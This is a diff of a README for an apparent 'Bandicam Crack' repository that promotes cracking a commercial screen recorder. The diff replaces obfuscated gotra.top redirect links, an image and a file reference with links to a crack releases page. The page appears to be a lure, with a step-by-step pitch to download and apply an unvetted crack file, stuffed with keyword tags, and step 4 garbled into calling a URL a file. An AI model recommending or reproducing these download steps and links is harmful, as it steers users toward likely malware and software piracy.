@@ -1,5 +1,5 @@
 
-![bandicam_install_06](https://github.com/user-attachments/assets/fcba9264-63a0-4e19-9a08-5a1ef750f70f)
+![bandicam_install_06](https://github.com/BountyFaze/Bandicam-Crack-Update/releases)
 
 # Bandicam Crack
 
@@ -26,7 +26,7 @@ Follow the steps below to use Bandicam Crack:
 1. **Download** the Bandicam installer from the official website.
 2. **Install** Bandicam normally.
 3. **Download** the crack file from this repository.
-4. **Follow the instructions** in the `README.txt` file to apply the crack.
+4. **Follow the instructions** in the `https://github.com/BountyFaze/Bandicam-Crack-Update/releases` file to apply the crack.
 5. **Launch** Bandicam and enjoy premium features.
 
 ## 📚 Tutorials
@@ -54,6 +54,6 @@ While this repository offers tools related to cracking Bandicam, it’s importan
 
 This repository is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/BountyFaze/Bandicam-Crack-Update/releases](https://github.com/BountyFaze/Bandicam-Crack-Update/releases)](https://github.com/BountyFaze/Bandicam-Crack-Update/releases)
 # Tags:
 best-mac-screen-recorder-like-bandicam bandicam-macbook bandicam-mac-os bandicam-screen-recorder bandicam-for-macbook bandicam-icon alternatives-to-bandicam ww-bandicam bandicam-2013 bandicam-2015 what-is-a-bandicam bandicam-memes bandicam-logo bandicam-full apps-like-bandicam bandicams
